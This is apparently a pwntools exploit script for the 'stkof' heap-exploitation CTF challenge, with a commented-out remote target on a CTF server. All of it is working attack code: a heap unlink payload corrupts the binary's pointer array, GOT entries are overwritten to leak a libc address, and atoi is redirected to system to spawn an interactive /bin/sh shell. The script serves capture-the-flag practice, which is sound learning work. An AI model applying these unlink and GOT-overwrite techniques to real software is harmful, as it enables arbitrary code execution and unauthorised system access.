from pwn import *

p = process('./stkof')
#p = remote('node4.buuoj.cn', 29039)
#context.log_level = 'debug'
elf = ELF('stkof')
libc = ELF('libc-2.23.so')

heaparray = 0x602140

def alloc(size):
	p.sendline(b'1')
	p.sendline(str(size).encode())

def edit(index, size, content):
	p.sendline(b'2')
	p.sendline(str(index).encode())
	p.sendline(str(size).encode())
	p.send(content)

def delete(index):
	p.sendline(b'3')
	p.sendline(str(index).encode())

def show(index):
	p.sendline(b'4')
	p.sendline(str(index).encode())

alloc(0x1000) #1

alloc(0x20) #2
alloc(0x80) #3

#unlink
payload = p64(0) + p64(0x21) + p64(heaparray + 0x10 - 0x18) + p64(heaparray + 0x10 - 0x10)
payload += p64(0x20) + p64(0x90)
edit(2, len(payload), payload)
delete(3)


#leak libc
payload = b'a' * 0x8 + p64(elf.got['strlen']) + p64(elf.got['atoi'])
edit(2, len(payload), payload)

#override strlen to puts
edit(0, 0x8, p64(elf.plt['puts']))

#leak puts
show(1)
p.recv(0x1b)
atoi_real_addr = u64(p.recv(6).ljust(8, b'\0'))
p.recv()
libc_base = atoi_real_addr - libc.sym['atoi']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']

edit(1, 0x8, p64(system))
p.recv()

p.sendline(b'/bin/sh')

p.interactive()